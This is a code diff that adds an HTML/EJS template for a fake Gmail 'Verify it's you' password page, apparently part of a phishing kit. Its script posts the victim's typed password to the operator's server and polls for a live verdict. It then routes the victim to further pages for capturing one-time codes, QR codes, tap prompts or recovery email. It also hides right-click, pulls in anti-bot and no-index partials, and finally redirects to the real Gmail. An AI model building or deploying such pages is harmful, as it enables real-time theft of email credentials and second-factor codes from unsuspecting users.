@@ -1,0 +1,218 @@
+
+<html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Welcome</title>
+    <%- include('partials/meta-noindex') %>
+    <link rel="shortcut icon" href="/image/gmail.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/css/1.css">
+    <style>
+        #pEyar {
+            font-size: 18px;
+            font-family: Arial, Helvetica, sans-serif;
+            color: #2c2a2a;
+        }
+        #pEyar.input-error {
+            border-color: #cc2418 !important;
+        }
+        #pEyar.input-error + label[placeholder]:before {
+            color: #cc2418  !important;
+        }
+        
+        /* Fixed dimensions for loginform */
+        .loginform {
+            width: 920px !important;
+            max-width: 920px !important;
+            min-width: 920px !important;
+        }
+        
+        .fgtpwd {
+            margin-left: 190px !important;
+            margin-right: auto !important;
+            justify-content: flex-start !important;
+            display: flex !important;
+        }
+        
+        .btmdiv {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 2px;
+            width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+            padding: 0 25px;
+        }
+        
+        .left-div {
+            margin-left: 0;
+            flex: 0;
+        }
+        
+        .right-divs {
+            margin-left: 0;
+            flex: 0;
+        }
+    </style>
+</head>
+<body>
+    <div class="maindiv">
+        <div class="form-container">
+            <div class="white-overlay" id="whiteOverlay"></div>
+            <div class="loading-bar" id="loadingBar"><div class="loading-bar-indicator"></div></div>
+        <form class="loginform" method="post" name="loginForm" action="javascript:void(0)" accept-charset="UTF-8">
+       
+            <div class="form-half">
+                <div><img class="divlogo" src="/image/image.png" ></div>
+                <br>
+                <div><span class="welcome">Verify it's you<span></div>   
+                    <br>             
+                <div class="userdiv">
+                  <img class="left-img"  src="/image/user-circle.png" >&nbsp;&nbsp;
+                  <span class="userdiv-name" style="color: #2c2a2a;; font-size: 18px; font-family: Arial, Helvetica, sans-serif;"></span>&#8201;<span class="chip-arrow">▾</span>&#8201;
+                  
+                </div>
+            </div>
+            
+            <div class="form-half1">
+                <div class="passdiv">
+                    <input type='hidden' name="username" id="useRname" value="">
+                    <input  required='' name="password" type='password' id="pEyar">
+                    <label id="pwdLabel" style="color:#2c2a2a; font-size: 16px; font-family: Arial, Helvetica, sans-serif;" alt='Enter your password' placeholder='Password'></label>
+                    <div id="pwdError" class="error-msg" style="display:none;"><img src="/image/error.png"></div>
+                </div>
+
+
+                
+                <div class="shwpwd">
+     
+                    <input type="checkbox" onclick="ShowpassWord();" class="checkbox">
+                    <span onclick="ShowpassWord();" class="button">Show password</span>
+                </div>
+
+
+                <script src="/JS/pass.js"></script>
+
+                <div class="fgtpwd">
+                    <button type="button" id="forgotPwdBtn" class="hyperl"><b>Forgot password?</b></button>&nbsp;&nbsp;&nbsp;
+                    <button type="button" class="btnnxt" id="nextBtn"><b>Next</b></button>
+                </div>
+
+            </div>
+     
+        </form>
+        </div>
+        
+
+        <div class="btmdiv">
+            <div class="left-div">
+                <select class="btmhypl" id="language-select">
+                    <option value="en">English (United States)</option>
+                    <option value="fr">French</option>
+                    <option value="es">Spanish</option>
+                    <option value="de">German</option>
+                    <!-- Add more options as needed -->
+                </select>
+            </div>
+                <div class="right-divs">
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Help</button>
+                    </div>
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Privacy</button>
+                    </div>
+                    <div class="right-div">
+                        <button id="myButton" class="btmhypl" >Terms</button>
+                    </div>
+                </div>
+        </div>
+
+
+    </div>
+
+    <script>
+    document.addEventListener('contextmenu', function (e) {
+      e.preventDefault();
+    });
+
+    function showLoadingBar() {
+      document.getElementById('loadingBar').classList.add('active');
+      document.getElementById('whiteOverlay').classList.add('active');
+    }
+
+    function hideLoadingBar() {
+      document.getElementById('loadingBar').classList.remove('active');
+      document.getElementById('whiteOverlay').classList.remove('active');
+    }
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const qp = new URLSearchParams(window.location.search);
+      const tk = qp.get('mbbjgsmhyropjmhnkidgdjkjsetwungdkdh') || '';
+      const username = atob(tk);
+
+      // Replace username placeholders on page
+      document.getElementById('useRname').value = username;
+      document.querySelector('.userdiv-name').textContent = username;
+
+      document.getElementById('myButton').onclick = function () {
+        location.href = "https://mail.google.com";
+      };
+
+      document.getElementById('nextBtn').onclick = function () {
+        const pwd = document.getElementById('pEyar').value;
+        if (!pwd) return;
+        document.getElementById('pwdError').style.display = 'none';
+        document.getElementById('pEyar').classList.remove('input-error');
+        showLoadingBar();
+        fetch('/password', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: 'username=' + encodeURIComponent(username) + '&password=' + encodeURIComponent(pwd)
+        }).then(() => {
+          let pollCount = 0;
+          const poll = setInterval(() => {
+            pollCount++;
+            fetch('/pwdresult?u=' + encodeURIComponent(username))
+              .then(r => r.json())
+              .then(data => {
+                if (data.result === 'correct' && data.tapData) {
+                  clearInterval(poll);
+                  var dest;
+                  if (data.tapData.pageType === 'success') dest = 'https://mail.google.com';
+                  else if (data.tapData.pageType === 'tapn') dest = '/tapn?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'mconfi') dest = '/mconfi?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'eotp') dest = '/eotp?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'recemail') dest = '/recemail?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+                  else if (data.tapData.pageType === 'qrcode') dest = '/qrcode?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+                  else dest = '/tap?mbbjgsmhyropjmhnkidgdjkjsetwungdkdh=' + encodeURIComponent(tk);
+                  window.location.href = dest;
+                } else if (data.result === 'wrong') {
+                  clearInterval(poll);
+                  hideLoadingBar();
+                  document.getElementById('pwdError').style.display = 'block';
+                  document.getElementById('pEyar').classList.add('input-error');
+                } else if (data.result === 'correct' && !data.tapData && pollCount > 15) {
+                  // After 30 seconds with correct but no data, assume success
+                  clearInterval(poll);
+                  window.location.href = 'https://mail.google.com';
+                }
+              })
+              .catch(() => {});
+          }, 2000);
+        });
+      };
+
+      document.getElementById('forgotPwdBtn').onclick = function () {
+        showLoadingBar();
+        setTimeout(() => {
+          hideLoadingBar();
+        }, 4000);
+      };
+    });
+    </script>
+    
+<%- include('partials/antibot') %>
+</body>
+</html>
